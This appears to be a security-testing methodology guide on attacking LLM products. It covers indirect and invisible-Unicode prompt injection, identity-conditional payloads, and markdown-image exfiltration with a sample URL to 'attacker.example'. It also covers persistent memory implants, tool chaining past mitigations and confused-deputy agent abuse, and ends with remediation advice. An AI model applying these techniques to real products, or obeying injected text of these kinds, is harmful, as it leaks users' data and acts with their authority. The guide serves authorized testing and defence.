# AI red teaming — prompt injection, exfiltration, persistence

Load this when the target ships any LLM feature: assistant, chatbot, AI sidebar, summarizer, AI
search, code assistant, or an agent with tools. **The bug is almost never "the model said something
bad". The bug is data crossing a trust boundary, an action taken as the user, or state that persists
into the victim's future sessions.** Grade against §7 before writing anything up.

Primary research behind this doc: Johann Rehberger's archive at <https://embracethered.com/blog/>.
Every technique below carries the post it came from. Sections marked EXTRAPOLATION are this
library's generalisation, not his claim.

Cross-references — do not duplicate these: [[mcp-security]] (MCP tool-description poisoning,
cross-server composition), [[rag-vector-attacks]] (retrieval corpus poisoning, vector-store IDOR),
[[agentic-browser-hijack]] (AI-browser intent collision, agent-navigation exfil).

## 1. Surface checklist — enumerate before you inject

| Ask | Why it decides the attack |
|---|---|
| Where does **untrusted text** enter the context? | web page, uploaded doc/PDF, email, calendar invite, filename, code comment, API response, retrieved RAG chunk, image |
| What **renders** the output? | markdown? images auto-loaded? HTML? links clickable? → §3 picks itself |
| What **tools/functions** can it call, and whose authority do they run with? | tool list = the actual impact ceiling (§5) |
| Is there **memory/persistence** across sessions? | the severity multiplier (§4) |
| What **egress** exists? | image fetch, link, tool with a URL arg, webhook |
| Is there a **human confirmation** step, and what does it actually show? | invisible text defeats it (§2) |

Get the tool inventory and the system-prompt boundary first. Everything after is cheaper once you
know what the agent is *able* to do.

## 2. Injection taxonomy and payloads

**Direct** — attacker types at the model (jailbreak). Usually self-harm only; low value unless it
unlocks a tool.
**Indirect / second-order** — attacker plants text the model later ingests on a *victim's* behalf.
**This is the one that pays**, because the attacker never touches the victim's session.
<https://embracethered.com/blog/posts/2023/ai-injections-direct-and-indirect-prompt-injection-basics/>

Delivery that survives a human skim, from the same post: 1px / background-coloured text on a page,
and the `[system](#prompt)` pseudo-header trick to make injected text read as privileged.

### Invisible payloads — Unicode Tags Block
Characters in the Unicode Tags block (U+E0000+) are **invisible to humans but tokenized by the
model**. Hide instructions inside text the victim pastes, or inside a PDF/RAG document.
<https://embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags/>

Two directions, test both — the post is explicit that models can also **emit** hidden text, which is
what turns this into an exfil channel rather than just an input trick:
1. attacker → model (hidden instruction)
2. model → attacker (hidden data in visible-looking output)

Claude interpreted Unicode Tags too (reported Feb 2024, vendor response "Not Applicable"); OpenAI
fixed it in the WebUI. **So this is per-product and per-surface — re-test, do not assume.**
<https://embracethered.com/blog/posts/2024/claude-hidden-prompt-injection-ascii-smuggling/>

**This defeats human-in-the-loop review**, which is the control most AI features lean on: the
reviewer approves text whose real instructions they cannot see. Say that explicitly in the report.

### Conditional / targeted payloads
Branch the payload on who is reading it — identity, job title, tenant — so it detonates only for the
intended victim and looks inert to everyone else, including reviewers.
<https://embracethered.com/blog/posts/2024/whoami-conditional-prompt-injection-instructions/>
That post also frames injection as RCE-equivalent *within the assistant's authority*, which is the
right mental model for severity: ask what the assistant can do, not what the model can say.

## 3. Exfiltration primitives — and the oracle for each

The strongest material in the archive. The pattern is always the same: **get the model to render
something that makes the victim's browser issue an attacker-bound request with secrets in the URL.**

### Markdown image rendering (the canonical one)
If the client auto-renders markdown images, the model emitting an image URL *is* a GET with your data:

```
![logo](https://attacker.example/logo.png?q=<DATA THE MODEL WAS TOLD TO APPEND>)
```

Confirmed against Bing Chat (fixed by MSRC 15 Jun 2023 via an image-domain CSP) — including a
**multi-turn delayed** variant where the injection lands in one turn and exfiltrates in a later one.
<https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/>

Same primitive against ChatGPT plugins, exfiltrating chat history via plugin-retrieved content.
OpenAI declined to fix in Apr 2023 ("it's a feature") — so on any target, **check whether the
renderer is the fix or whether it was never fixed**.
<https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/>

That post also names **Cross Plugin Request Forgery**: injected page content invokes a *different*
plugin the user has enabled (their Expedia example). The modern form is tool-chaining — see §5.

### Invisible-character channels
Beyond the Tags block: **Variant Selectors VS1-256** give a byte-mapping channel (Paul Butler's
work), and **"Sneaky Bits"** encodes arbitrary binary with U+2062/U+2064. Both ride along inside a
URL or ordinary-looking text, and both survive copy/paste — so the victim can carry the payload for
you.
<https://embracethered.com/blog/posts/2025/sneaky-bits-and-ascii-smuggler/>

### The oracle — do not skip this
A rendered image tag in a transcript is **not** proof. Prove the request arrived:

```bash
# mint the listener from YOUR tooling, then confirm the hit — and that clientIp is not your own egress
# (Burp Collaborator, interactsh, or any log you control)
```
Then record: the exact injected text, the model's rendered output, **and the server-side hit with
the exfiltrated value in the query string**. Three artifacts or it is not a finding. If you cannot
show the hit, you have a rendering quirk, not exfiltration. (See [[controls-and-oracles]] on
OOB-poll blindness — a stale or pasted-in payload polls silent forever.)

## 4. Persistence — memory implants, the severity multiplier

A one-shot injection affects one answer. An implant in long-term memory affects **every future
session**, which is what turns a Medium into a High/Critical.

ChatGPT memories could be written via injected content (`to=bio`) arriving from Connected Apps or
uploaded images. The UI string **"Memory updated" is the oracle** — it tells you the write landed.
Tool-chaining plus delayed execution bypassed the browsing mitigation. OpenAI closed it as a
model-safety issue rather than a security bug.
<https://embracethered.com/blog/posts/2024/chatgpt-hacking-memories/>

**SpAIware** is the chain worth imitating: implant a memory whose instruction is "exfiltrate every
future conversation", and every later chat leaks via invisible image rendering — spyware with no
malware. The client-side `url_safe` check was bypassed on macOS/Android; the app was fixed in
v1.2024.247 (Sep 2024), **but memory injection itself was not**.
<https://embracethered.com/blog/posts/2024/chatgpt-macos-app-persistent-data-exfiltration/>

Test order on any product with memory:
1. can injected content write memory at all? (watch for the write-confirmation oracle)
2. does the written memory survive a new session?
3. does it still fire when the original injected document is gone?
4. can the victim see it, and can they tell it is hostile?

Step 3 is the finding. Step 4 decides the severity.

## 5. Agent and tool abuse

EXTRAPOLATION of the Cross-Plugin-Request-Forgery idea above into current agent designs:

- **Confused deputy** — injected text makes the agent call a tool using the *user's* authority.
  Impact = the union of every tool, not the one you injected through.
- **Tool chaining to bypass a per-tool mitigation** — if tool A is restricted but tool B can reach
  the same egress, chain. This is exactly how the browsing mitigation was bypassed in the memory
  work above.
- **Argument injection** — control a URL/path/query argument of a legitimate tool rather than the
  tool choice; often unvalidated because "the model chose it".
- **Privilege inheritance** — the agent runs with the victim's session, so every authz test in
  [[idor-access-control]] applies *through* the agent. Ask whether the agent re-checks authorization
  per tool call or inherits once.

## 6. Per-product notes (as documented, with dates — verify before claiming any of it is live)

| Product | Documented issue | Vendor outcome |
|---|---|---|
| Bing Chat | markdown-image exfil, incl. multi-turn delayed | **fixed** 15 Jun 2023, image-domain CSP |
| ChatGPT plugins | markdown-image exfil of chat history; Cross Plugin Request Forgery | **declined** Apr 2023 ("a feature") |
| ChatGPT memory | memory implant via `to=bio` from Connected Apps / image upload | closed as model-safety, **not** a security fix |
| ChatGPT macOS/Android | SpAIware persistent exfil; `url_safe` client check bypassed | app **fixed** v1.2024.247 Sep 2024; memory injection unfixed |
| Anthropic Claude | interprets Unicode Tags Block (hidden injection) | **"Not Applicable"** Feb 2024 |
| OpenAI WebUI | Unicode Tags | **fixed** |
| Microsoft Copilot | conditional/identity-targeted injection, summary tampering | **no immediate servicing** Mar 2024 |

A patched technique is still methodology — the next product ships the same mistake. But **never
present a fixed issue as a live bug**: fingerprint the version and re-prove it.

## 7. The impact gate — apply this BEFORE writing anything

Not a finding:
- the model said something rude, biased, or false
- a jailbreak that only affects the attacker's own session
- "the model can be instructed to ignore its system prompt" with no onward effect
- a rendered image tag with no proven server-side hit

A finding, with the proof required:
| Claim | Minimum proof |
|---|---|
| Data exfiltration | injected text + model output + **server-side request log containing the data** |
| Action as the user | the tool call and its **state change**, shown from a second account or an audit trail |
| Persistence | the implant firing in a **fresh session** with the original payload removed |
| Cross-user impact | the victim is a **different identity** from the attacker — two accounts, per [[idor-access-control]] |

Then run it through [[validate]] like any other finding. The AI wrapper does not lower the evidence
bar, and "LLMs are non-deterministic" is not an excuse for a single unreproduced screenshot —
re-run it and say how many times out of how many it fired.

## 8. Defences (for the remediation section)

| Class | Remediation one-liner |
|---|---|
| Indirect injection | treat all retrieved/ingested content as untrusted data, never as instructions; isolate it structurally from the prompt |
| Markdown-image exfil | allowlist image domains via CSP, or disable auto-rendering of model-supplied image URLs |
| Link exfil | no auto-render of model-supplied URLs; show the full destination; server-side egress allowlist |
| Invisible characters | **strip the Unicode Tags block, variant selectors and zero-width/invisible chars at both input and output** |
| Memory implants | require explicit user confirmation for memory writes, show a readable diff, and never allow retrieved content to trigger a write |
| Tool abuse | re-authorize per tool call against the *user's* permissions; treat tool args as untrusted input and validate them |
| Human-in-the-loop | render what the model actually received/emitted, after invisible-character normalisation — otherwise the control is theatre |
